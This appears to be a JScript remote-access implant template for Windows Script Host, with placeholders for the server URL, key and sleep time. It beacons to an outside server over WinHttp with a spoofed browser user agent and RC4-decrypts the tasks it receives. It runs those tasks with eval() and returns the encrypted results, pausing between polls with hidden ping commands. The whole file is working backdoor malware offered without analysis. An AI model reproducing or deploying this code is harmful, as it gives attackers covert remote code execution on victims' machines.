encrypt = function (key, str) {
	var s = [], j = 0, x, res = '';
	for (var i = 0; i < 256; i++) {
		s[i] = i;
	}
	for (i = 0; i < 256; i++) {
		j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
		x = s[i];
		s[i] = s[j];
		s[j] = x;
	}
	i = 0;
	j = 0;
	for (var y = 0; y < str.length; y++) {
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		x = s[i];
		s[i] = s[j];
		s[j] = x;
		res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
	}
	return res;
}

Cookie = function (w) {
	try {
		strCookie = w.getResponseHeader("Set-Cookie");
		return strCookie.split(";")[0].split(",")[0].split("=");
	} catch (e1) {
		return "";
	}
}

Post = function (context, session) {
	w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	w.SetTimeouts(0, 0, 0, 0);
	try {
		w.Open("POST", "~URL_RUN~", false);
		if (session.length > 0) {
			w.SetRequestHeader("Cookie", "session=" + session)
		}
		w.SetRequestHeader("Content-Type", "text/html; Charset=UTF-8");
		w.SetRequestHeader("User-Agent", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
		w.Send(context);
		return [w.ResponseText, Cookie(w)];
	} catch (e1) {
		return ["", ""];
	}
}

Random = function (max) {
	return Math.floor(Math.random() * Math.floor(max));
}

Sleep = function (n) {
	for (i = 0; i < n; i++) {
		s = new ActiveXObject("WScript.Shell").run("ping -n 2 127" + ".0.0.1", 0, true);
	}
}
b64enc = function (ResponseText) {
	xml_dom = new ActiveXObject("MSXML2.DOMDocument");
	ado_stream = new ActiveXObject("ADODB.Stream");
	tmpNode = xml_dom.createElement("tmpNode");
	tmpNode.dataType = "bin.base64";
	ado_stream.Charset = "UTF-8";
	ado_stream.Type = 2;//   1=adTypeBinary   2=adTypeText
	if (ado_stream.state == 0) {//   0=adStateClosed 1=adStateOpen
		ado_stream.Open();
	}
	ado_stream.WriteText(ResponseText);
	ado_stream.Position = 0;
	ado_stream.Type = 1;//   1=adTypeBinary   2=adTypeText
	tmpNode.nodeTypedValue = ado_stream.Read(-1);//   -1=adReadAll
	ado_stream.Close();
	//strip \n and utf-BOM
	tmp_retcode = tmpNode.text.replace(/\n/g, "");
	if (tmp_retcode.length >= 4 && tmp_retcode.substring(0, 4) == "77u/") return tmp_retcode.substring(4, tmp_retcode.length);
	else return tmp_retcode;

}
run = function () {
	r = ["", []];
	session = "";
	SleepTime = parseInt("~SLEEP~");
	while (true) {
		c = "";
		//update session
		if (r[1].length == 2 && r[1][0] == "session") session = r[1][1];
		//do task
		if (r[0].length > 0) {
			// decrypt reponse
			d = encrypt("~KEY~", r[0]);
			// eval task script
			try {
				eval(d);
			} catch (e1) { }
			// send result
			r = Post(b64enc(encrypt("~KEY~", c)), session);
		}
		else {
			r = Post(c, session);
		}
		Sleep(Random(SleepTime));
	}
}
run();